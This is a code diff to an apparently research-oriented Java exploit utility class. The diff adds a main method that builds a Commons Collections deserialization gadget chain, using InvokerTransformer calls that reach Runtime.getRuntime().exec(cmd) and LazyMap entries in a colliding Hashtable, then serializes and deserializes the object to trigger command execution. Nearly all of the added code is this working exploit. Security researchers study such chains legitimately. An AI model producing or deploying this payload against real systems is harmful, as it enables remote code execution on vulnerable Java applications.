@@ -19,10 +19,7 @@ import java.lang.reflect.*;
 import java.math.BigInteger;
 import java.net.MalformedURLException;
 import java.net.URL;
-import java.util.HashMap;
-import java.util.Map;
-import java.util.PriorityQueue;
-import java.util.Random;
+import java.util.*;
 
 import static expUtils.ReflectUtils.getClassByte;
 
@@ -172,9 +169,39 @@ public class ExpUtils {
 
 
     public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException, NoSuchMethodException, InstantiationException, InvocationTargetException {
-//
-        Map.Entry entry = (Map.Entry) getEvilTransformMap().entrySet().iterator().next();
-        entry.setValue("123");
+        System.out.println(System.getProperty("java.version"));
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
+                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
+                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{cmd})
+        };
+        Transformer[] fakeTransformers = new Transformer[]{
+                new ConstantTransformer(1),
+        };
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);
+
+
+
+        Map innerHashMap1 = new HashMap();
+        Map innerHashMap2 = new HashMap();
+        LazyMap lazyMap1 = (LazyMap) LazyMap.decorate(innerHashMap1, getEvilChainedTransformer());
+        LazyMap lazyMap2 = (LazyMap) LazyMap.decorate(innerHashMap2, getEvilChainedTransformer());
+
+        lazyMap1.put("yy",1);
+        lazyMap2.put("zZ",2);
+
+        Hashtable objectObjectHashtable = new Hashtable();
+        objectObjectHashtable.put(lazyMap1,1);
+        objectObjectHashtable.put(lazyMap2,2);
+
+        ReflectUtils.setFields(chainedTransformer,"iTransformers", transformers);
+        lazyMap2.remove("yy");
+        String path =  serialize(objectObjectHashtable);
+        Hashtable obj = (Hashtable) unserialize(path);
+        System.out.println(obj);
 
     }
 }
